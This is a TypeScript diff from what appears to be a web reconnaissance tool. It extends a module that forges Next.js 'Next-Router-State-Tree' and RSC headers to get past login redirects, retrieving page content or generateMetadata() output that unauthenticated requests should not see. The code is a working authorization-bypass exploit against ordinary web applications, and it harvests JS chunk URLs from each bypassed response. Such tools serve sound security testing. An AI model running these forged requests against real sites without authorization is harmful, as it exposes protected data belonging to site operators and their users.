@@ -62,13 +62,50 @@ export const extractChunkPathsFromFlightBody = (body: string): string[] => {
 };
 
 export interface RouterStateForgeResult {
-    /** Page URLs where a forged ancestor claim returned content without a NEXT_REDIRECT marker. */
+    /** Page URLs where a forged full-content ancestor claim returned content without a NEXT_REDIRECT marker. */
     bypassedUrls: string[];
-    /** New downloadable JS chunk URLs recovered from bypassed Flight payloads. */
+    /** Page URLs where only a metadata-only leaf claim succeeded (dynamic generateMetadata() output, not the full page body) — a distinct, narrower disclosure than `bypassedUrls`. */
+    metadataOnlyBypassedUrls: string[];
+    /** New downloadable JS chunk URLs recovered from any bypassed Flight payload. */
     newJsUrls: string[];
 }
 
 const REQUEST_TIMEOUT_MS = 15000;
+
+interface ForgeAttemptResult {
+    success: boolean;
+    body: string;
+}
+
+/** Sends one forged-ancestor RSC request and reports whether it looks like a successful bypass. */
+const attemptForge = async (
+    candidateUrl: string,
+    ancestors: string[],
+    leafMode: LeafMode,
+    timeout: number
+): Promise<ForgeAttemptResult> => {
+    const stateTree = buildStateTreeHeader(ancestors, leafMode);
+    const nextUrl = "/" + ancestors.join("/");
+    const rscKey = computeStrongRscKey(stateTree, nextUrl);
+
+    const forgedUrl = new URL(candidateUrl);
+    forgedUrl.searchParams.set("_rsc", rscKey);
+
+    const forged = await rawRequest(forgedUrl.toString(), {
+        timeout,
+        headers: {
+            RSC: "1",
+            "Next-Router-State-Tree": stateTree,
+            "Next-Url": nextUrl,
+        },
+    });
+    if (!forged) return { success: false, body: "" };
+
+    const contentType = forged.headers["content-type"] ?? "";
+    const success =
+        forged.status === 200 && contentType.includes("text/x-component") && !containsNextRedirectMarker(forged.body);
+    return { success, body: forged.body };
+};
 
 /**
  * For each candidate page URL that redirects an unauthenticated request, retries as an
@@ -76,6 +113,11 @@ const REQUEST_TIMEOUT_MS = 15000;
  * already mounted. If Next.js skips re-executing that ancestor's layout component (see
  * js-recon-internal-docs#142), the response comes back 200 without a NEXT_REDIRECT
  * record — content a plain crawl would never see.
+ *
+ * Two leaf modes are tried per candidate: an ordinary `page` claim (full body disclosure)
+ * first, and — only if every `page` attempt fails — a `metadata-only` claim, which can
+ * still leak dynamic `generateMetadata()` output even where a full-body claim doesn't
+ * cleanly apply (e.g. a tenant-scoped layout).
  */
 const next_routerStateForge = async (
     candidateUrls: string[],
@@ -83,6 +125,7 @@ const next_routerStateForge = async (
     timeout: number = REQUEST_TIMEOUT_MS
 ): Promise<RouterStateForgeResult> => {
     const bypassedUrls: string[] = [];
+    const metadataOnlyBypassedUrls: string[] = [];
     const newJsUrls: string[] = [];
 
     await runWithConcurrency(candidateUrls, threads, async (candidateUrl) => {
@@ -99,47 +142,47 @@ const next_routerStateForge = async (
         const baseline = await rawRequest(candidateUrl, { timeout });
         if (!baseline || baseline.status < 300 || baseline.status >= 400) return;
 
-        for (const ancestors of buildAncestorAttempts(segments)) {
-            const stateTree = buildStateTreeHeader(ancestors, "page");
-            const nextUrl = "/" + ancestors.join("/");
-            const rscKey = computeStrongRscKey(stateTree, nextUrl);
+        const recordChunks = (body: string) => {
+            for (const chunkPath of extractChunkPathsFromFlightBody(body)) {
+                newJsUrls.push(new URL(chunkPath.startsWith("/") ? chunkPath : `/${chunkPath}`, parsed.origin).toString());
+            }
+        };
 
-            const forgedUrl = new URL(candidateUrl);
-            forgedUrl.searchParams.set("_rsc", rscKey);
+        const ancestorAttempts = buildAncestorAttempts(segments);
 
-            const forged = await rawRequest(forgedUrl.toString(), {
-                timeout,
-                headers: {
-                    RSC: "1",
-                    "Next-Router-State-Tree": stateTree,
-                    "Next-Url": nextUrl,
-                },
-            });
-            if (!forged) continue;
-
-            const contentType = forged.headers["content-type"] ?? "";
-            if (
-                forged.status === 200 &&
-                contentType.includes("text/x-component") &&
-                !containsNextRedirectMarker(forged.body)
-            ) {
+        let bypassed = false;
+        for (const ancestors of ancestorAttempts) {
+            const result = await attemptForge(candidateUrl, ancestors, "page", timeout);
+            if (result.success) {
                 printMsg(
                     MSG.Run,
                     `[✓] Forged next-router-state-tree bypass revealed content: ${candidateUrl} (claimed ancestor: /${ancestors.join("/")})`
                 );
                 bypassedUrls.push(candidateUrl);
-                for (const chunkPath of extractChunkPathsFromFlightBody(forged.body)) {
-                    newJsUrls.push(
-                        new URL(chunkPath.startsWith("/") ? chunkPath : `/${chunkPath}`, parsed.origin).toString()
-                    );
-                }
+                recordChunks(result.body);
+                bypassed = true;
                 break; // one successful ancestor claim per candidate is enough
+            }
+        }
+        if (bypassed) return;
+
+        for (const ancestors of ancestorAttempts) {
+            const result = await attemptForge(candidateUrl, ancestors, "metadata-only", timeout);
+            if (result.success) {
+                printMsg(
+                    MSG.Run,
+                    `[✓] Forged metadata-only next-router-state-tree bypass revealed metadata: ${candidateUrl} (claimed ancestor: /${ancestors.join("/")})`
+                );
+                metadataOnlyBypassedUrls.push(candidateUrl);
+                recordChunks(result.body);
+                break;
             }
         }
     });
 
     return {
         bypassedUrls: [...new Set(bypassedUrls)],
+        metadataOnlyBypassedUrls: [...new Set(metadataOnlyBypassedUrls)],
         newJsUrls: [...new Set(newJsUrls)],
     };
 };
